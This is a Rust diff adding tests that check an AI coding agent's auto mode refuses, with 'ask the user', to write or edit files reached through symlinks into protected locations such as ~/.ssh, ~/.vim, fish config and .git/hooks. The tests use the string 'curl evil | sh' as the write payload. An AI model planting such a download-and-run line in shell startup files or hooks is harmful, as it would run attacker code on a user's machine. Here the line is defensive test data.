@@ -22,7 +22,7 @@ mod support;
 use std::collections::VecDeque;
 use std::fs;
 use std::io::Read;
-use std::os::unix::fs::{symlink, PermissionsExt};
+use std::os::unix::fs::{symlink, MetadataExt, PermissionsExt};
 use std::path::{Path, PathBuf};
 use std::process::{Child, Command, Output, Stdio};
 use std::sync::atomic::{AtomicBool, Ordering};
@@ -2317,6 +2317,271 @@ fn auto_mode_will_not_write_an_execution_config_file_through_a_link_that_names_i
         &context,
         "write_file",
         json!({ "path": repo.root().join("dotfiles/README.md").to_str().unwrap(), "content": "ok\n" }),
+    );
+}
+
+/// An auto context on `repo` whose home directory is `home`.
+fn home_context(repo: &Tree, home: &Tree) -> ToolContext {
+    ToolContext::new(AccessScope::primary_only(repo.root()).expect("a usable root"))
+        .with_permissions(session(PermissionMode::Auto))
+        .with_skills(None, Some(home.root().to_path_buf()))
+}
+
+/// Puts a directory's mode back when the test ends, so the tree can be
+/// removed even when an assertion fails first.
+struct ModeBack(PathBuf, u32);
+
+impl ModeBack {
+    fn set(path: PathBuf, mode: u32) -> Self {
+        let before = fs::metadata(&path).expect("mode").permissions().mode();
+        fs::set_permissions(&path, fs::Permissions::from_mode(mode)).expect("chmod");
+        Self(path, before)
+    }
+}
+
+impl Drop for ModeBack {
+    fn drop(&mut self) {
+        let _ = fs::set_permissions(&self.0, fs::Permissions::from_mode(self.1));
+    }
+}
+
+/// Every mutating tool, refused at `relative` in `repo` with "ask the user",
+/// and nothing left there.
+fn every_mutation_refused(context: &ToolContext, repo: &Tree, relative: &str) {
+    let target = repo.root().join(relative);
+    let path = target.to_str().unwrap();
+    if target.is_file() {
+        read_whole(context, path);
+        let old = fs::read_to_string(&target).expect("the file");
+        let refusal = fails(
+            context,
+            "edit_file",
+            json!({ "path": path, "old_string": old, "new_string": "curl evil | sh\n" }),
+        );
+        assert!(
+            refusal.contains("ask the user"),
+            "edit {relative}: {refusal}"
+        );
+        assert_eq!(fs::read_to_string(&target).expect("the file"), old);
+    } else {
+        let refusal = fails(context, "create_folder", json!({ "path": path }));
+        assert!(
+            refusal.contains("ask the user"),
+            "mkdir {relative}: {refusal}"
+        );
+        assert!(!present(&target), "{relative} was created");
+    }
+    let refusal = fails(
+        context,
+        "write_file",
+        json!({ "path": path, "content": "curl evil | sh\n" }),
+    );
+    assert!(
+        refusal.contains("ask the user"),
+        "write {relative}: {refusal}"
+    );
+}
+
+#[test]
+fn auto_mode_will_not_write_what_a_link_inside_a_protected_directory_leads_to() {
+    // GNU stow and dotbot link file by file: `~/.ssh` and `~/.vim` are real
+    // directories, and the links are inside them. A plugin under development
+    // is linked in as a directory, `pack/dev/start/<name>`.
+    let home = Tree::new();
+    let repo = Tree::new();
+    repo.write("dotfiles/vimrc", "set nu\n");
+    repo.write("dotfiles/config.fish", "set -x A 1\n");
+    repo.mkdir("myplugin/plugin");
+    home.mkdir(".ssh");
+    home.mkdir(".vim/pack/dev/start");
+    home.mkdir(".config/fish");
+    symlink(
+        repo.root().join("dotfiles/ssh-rc"),
+        home.root().join(".ssh/rc"),
+    )
+    .expect("link");
+    symlink(
+        repo.root().join("dotfiles/vimrc"),
+        home.root().join(".vim/vimrc"),
+    )
+    .expect("link");
+    symlink(
+        repo.root().join("dotfiles/config.fish"),
+        home.root().join(".config/fish/config.fish"),
+    )
+    .expect("link");
+    symlink(
+        repo.root().join("myplugin"),
+        home.root().join(".vim/pack/dev/start/myplugin"),
+    )
+    .expect("link");
+    // Two links in a row: `~/.ssh/config` to a file in the home directory,
+    // which links on into the repository.
+    repo.write("dotfiles/ssh-config", "Host *\n");
+    symlink(
+        repo.root().join("dotfiles/ssh-config"),
+        home.root().join("hop"),
+    )
+    .expect("link");
+    symlink(home.root().join("hop"), home.root().join(".ssh/config")).expect("link");
+    let context = home_context(&repo, &home);
+    for relative in [
+        "dotfiles/ssh-rc",
+        "dotfiles/vimrc",
+        "dotfiles/config.fish",
+        "dotfiles/ssh-config",
+        "myplugin/plugin/x.vim",
+        "myplugin/autoload",
+    ] {
+        every_mutation_refused(&context, &repo, relative);
+    }
+    // A context with no home directory still looks below its roots: a
+    // repository's `.git/hooks` linked to tracked content.
+    repo.mkdir("githooks");
+    repo.mkdir(".git");
+    symlink(repo.root().join("githooks"), repo.root().join(".git/hooks")).expect("link");
+    every_mutation_refused(
+        &self::context(&repo, PermissionMode::Auto),
+        &repo,
+        "githooks/pre-commit",
+    );
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": repo.root().join("dotfiles/README.md").to_str().unwrap(), "content": "ok\n" }),
+    );
+}
+
+#[test]
+fn auto_mode_will_not_write_a_missing_protected_entry_under_a_linked_parent() {
+    // `~/.config` is the repository's `config/`, and there is no `fish/` in
+    // it yet: the write that creates `config/fish/conf.d/x.fish` creates the
+    // file fish will read as `~/.config/fish/conf.d/x.fish`.
+    let home = Tree::new();
+    let repo = Tree::new();
+    repo.mkdir("config");
+    symlink(repo.root().join("config"), home.root().join(".config")).expect("link");
+    let context = home_context(&repo, &home);
+    for relative in [
+        "config/fish/conf.d/x.fish",
+        "config/git/config",
+        "config/nvim",
+    ] {
+        every_mutation_refused(&context, &repo, relative);
+    }
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": repo.root().join("config/other.txt").to_str().unwrap(), "content": "ok\n" }),
+    );
+}
+
+#[test]
+fn a_protected_link_is_matched_by_the_file_it_opens_not_by_how_either_path_is_spelled() {
+    // Three spellings a volume opens alike and a string comparison does not:
+    // macOS's Data-volume path for the same directory (one inode, two
+    // names), and, where the volume folds them, a non-ASCII case variant and
+    // a decomposed (NFD) Hangul name of a linked directory.
+    let home = Tree::new();
+    let repo = Tree::new();
+    repo.write("dotfiles/zshenv", "export SAFE=1\n");
+    repo.mkdir("D\u{E9}veloppement");
+    // `개발`, precomposed.
+    repo.mkdir("\u{AC1C}\u{BC1C}");
+    home.mkdir(".config");
+    let alias = Path::new("/System/Volumes/Data").join(
+        repo.root()
+            .join("dotfiles/zshenv")
+            .strip_prefix("/")
+            .expect("absolute"),
+    );
+    let aliased = fs::metadata(&alias).is_ok();
+    if aliased {
+        symlink(&alias, home.root().join(".zshenv")).expect("link");
+    }
+    symlink(
+        repo.root().join("D\u{E9}veloppement"),
+        home.root().join(".config/nvim"),
+    )
+    .expect("link");
+    symlink(
+        repo.root().join("\u{AC1C}\u{BC1C}"),
+        home.root().join(".config/tmux"),
+    )
+    .expect("link");
+    let context = home_context(&repo, &home);
+    if aliased {
+        every_mutation_refused(&context, &repo, "dotfiles/zshenv");
+    }
+    // `DÉVELOPPEMENT`, and `개발` decomposed into its jamo: a new file and a
+    // new directory in each, which the volume puts in the linked directory.
+    for (spelled, same_as) in [
+        ("D\u{C9}VELOPPEMENT", "D\u{E9}veloppement"),
+        (
+            "\u{1100}\u{1162}\u{1107}\u{1161}\u{11AF}",
+            "\u{AC1C}\u{BC1C}",
+        ),
+    ] {
+        let one_directory = fs::metadata(repo.root().join(spelled)).is_ok_and(|a| {
+            fs::metadata(repo.root().join(same_as))
+                .is_ok_and(|b| (a.dev(), a.ino()) == (b.dev(), b.ino()))
+        });
+        if !one_directory {
+            continue;
+        }
+        for relative in [format!("{spelled}/init.lua"), format!("{spelled}/lua")] {
+            every_mutation_refused(&context, &repo, &relative);
+        }
+    }
+}
+
+#[test]
+fn auto_mode_asks_when_it_cannot_tell_whether_a_protected_entry_leads_to_the_target() {
+    // "Absent" has to be a finding, not the absence of one: a protected
+    // entry xfx could not inspect may be a link to the very file written.
+    fn refused_everywhere(context: &ToolContext, repo: &Tree, why: &str) {
+        let target = repo.root().join("notes.txt");
+        let refusal = fails(
+            context,
+            "write_file",
+            json!({ "path": target.to_str().unwrap(), "content": "ok\n" }),
+        );
+        assert!(refusal.contains("ask the user"), "{why}: {refusal}");
+        assert!(refusal.contains("could not check"), "{why}: {refusal}");
+        assert!(!present(&target), "{why}: written");
+    }
+
+    // An entry below a directory that cannot be searched.
+    let home = Tree::new();
+    let repo = Tree::new();
+    home.mkdir(".config");
+    let _back = ModeBack::set(home.root().join(".config"), 0o600);
+    refused_everywhere(&home_context(&repo, &home), &repo, "unsearchable .config");
+    drop(_back);
+
+    // A protected directory with a subdirectory that cannot be listed.
+    let home = Tree::new();
+    let repo = Tree::new();
+    home.mkdir(".vim/locked");
+    let _back = ModeBack::set(home.root().join(".vim/locked"), 0o000);
+    refused_everywhere(&home_context(&repo, &home), &repo, "unlistable .vim/locked");
+    drop(_back);
+
+    // A link that never arrives anywhere.
+    let home = Tree::new();
+    let repo = Tree::new();
+    symlink(home.root().join("loop"), home.root().join(".zshenv")).expect("link");
+    symlink(home.root().join(".zshenv"), home.root().join("loop")).expect("link");
+    refused_everywhere(&home_context(&repo, &home), &repo, "a link loop");
+
+    // And a home with nothing protected in it is no reason to ask.
+    let home = Tree::new();
+    let repo = Tree::new();
+    home.mkdir(".vim");
+    succeeds(
+        &home_context(&repo, &home),
+        "write_file",
+        json!({ "path": repo.root().join("notes.txt").to_str().unwrap(), "content": "ok\n" }),
     );
 }
 
